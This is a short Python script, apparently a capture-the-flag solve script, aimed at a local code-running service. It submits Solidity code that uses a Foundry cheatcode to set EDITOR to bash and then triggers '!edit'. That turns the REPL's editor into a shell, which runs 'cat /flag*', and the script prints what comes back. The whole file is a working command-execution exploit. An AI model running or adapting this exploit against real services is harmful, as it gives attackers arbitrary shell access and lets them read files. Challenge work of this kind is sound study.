import os
import httpx
from urllib.parse import quote

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "3000")

client = httpx.Client(base_url=f"http://{HOST}:{PORT}")

code = "\n".join(
    [
        "//; cat /flag*",
        "interface Vm { function setEnv(string calldata name, string calldata value) external; }",
        "Vm vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);",
        'vm.setEnv("EDITOR", "bash");',
        "!edit",
    ]
)
uuid = client.get(f"/run?code={quote(code)}").json()["uuid"]
out = client.get(f"/out/{uuid}").text
print(out)
